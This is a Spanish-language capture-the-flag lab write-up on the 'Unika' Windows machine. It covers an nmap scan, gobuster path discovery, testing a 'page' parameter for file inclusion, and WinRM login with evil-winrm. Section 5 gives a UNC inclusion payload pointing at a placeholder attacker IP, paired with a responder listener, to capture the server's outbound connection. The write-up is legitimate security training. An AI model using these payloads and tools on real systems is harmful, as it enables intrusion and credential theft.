---
title: "Unika: enumeración inicial y acceso a la aplicación web"
description: "Primeros pasos de reconocimiento sobre una máquina Windows con Apache y PHP: escaneo de puertos, descubrimiento de rutas y análisis de un parámetro de inclusión."
category: "laboratorios"
draft: false
---

Este laboratorio documenta el reconocimiento inicial de una máquina de prueba con Windows. Los datos concretos de la máquina (dirección IP, credenciales y banderas) se omiten a propósito.

## 1. Escaneo de puertos y servicios

Primero se identifican los servicios expuestos con `nmap`:

```bash
nmap -sC -sV -Pn <IP_OBJETIVO>
```

El resultado muestra dos servicios HTTP:

- **Puerto 80:** Apache 2.4.52 sobre Windows, con PHP 8.1.1. El título de la página no está definido.
- **Puerto 5985:** Microsoft HTTPAPI, que corresponde a WinRM. Responde "Not Found" en la raíz.

El puerto 5985 es relevante más adelante, porque WinRM permite administración remota si se tienen credenciales válidas.

## 2. Descubrimiento de rutas

Con `gobuster` y una lista de palabras común se buscan rutas en el servidor web:

```bash
gobuster dir -u http://<IP_OBJETIVO>/ -w /usr/share/dirb/wordlists/common.txt
```

Hallazgos principales:

- `/index.php` responde con código 200.
- `/css/`, `/img/`, `/inc/` y `/js/` existen y redirigen (301).
- Varias rutas de Windows (`/aux`, `/con`, `/nul`, entre otras) devuelven 403. Esto no es un fallo real: es el manejo de nombres de dispositivo reservados de Windows.
- `/phpmyadmin`, `/server-status` y `/webalizer` devuelven 403, así que existen pero están restringidas.

## 3. Redirección a un nombre de host

`/index.php` no muestra contenido. Responde con una redirección `meta refresh` hacia un nombre de host:

```bash
curl -i http://<IP_OBJETIVO>/index.php
```

Para que el nombre resuelva localmente, se agrega una entrada en el archivo de hosts:

```text
<IP_OBJETIVO>  <HOST_DEL_LABORATORIO>
```

## 4. Análisis del parámetro `page`

La aplicación carga páginas mediante un parámetro GET:

```bash
curl -i "http://<HOST_DEL_LABORATORIO>/index.php?page=french.html"
curl -i "http://<HOST_DEL_LABORATORIO>/index.php?page=german.html"
```

Ambas peticiones responden 200 con contenido. Una petición con un nombre inexistente, escrita mal (`index.php/page=...`, sin `?`), no sirve para probar el parámetro, así que conviene revisar la sintaxis antes de sacar conclusiones.

El comportamiento del parámetro sugiere que el servidor incluye archivos según el valor recibido. Ese tipo de parámetro es un vector clásico de **inclusión de archivos**, y hay que probarlo con cuidado.

## 5. Prueba con una ruta de red (UNC)

Se intenta incluir un recurso desde una ruta de red, usando un listener en la máquina atacante para ver si el servidor intenta conectarse:

```bash
sudo responder -I <INTERFAZ_VPN> -wd
```

```text
http://<HOST_DEL_LABORATORIO>/index.php?page=//<IP_ATACANTE>/archivo
```

La respuesta del servidor fue un error `Permission denied` al abrir la ruta UNC. Eso indica que PHP sí intentó acceder a la ruta, pero el acceso fue denegado. Ese resultado es útil porque confirma el comportamiento del servidor sin necesidad de más pasos.

## 6. Acceso remoto con credenciales

Después del reconocimiento, se comprobó el acceso a WinRM con credenciales obtenidas durante el laboratorio:

```bash
evil-winrm -i <IP_OBJETIVO> -u <USUARIO> -p '<CONTRASEÑA>' -P 5985
```

Con acceso a la sesión se localizó la bandera en el directorio del usuario correspondiente. Su valor no se publica.

## Lecciones

- Un escaneo de puertos temprano define la superficie de ataque. Sin él, el resto del trabajo es adivinar.
- Un código 403 indica que una ruta existe. Un 404 indica que no existe.
- Un parámetro que carga archivos merece pruebas controladas antes de cualquier suposición.
- Las credenciales y las banderas no se publican en el texto. Se sustituyen por marcadores.
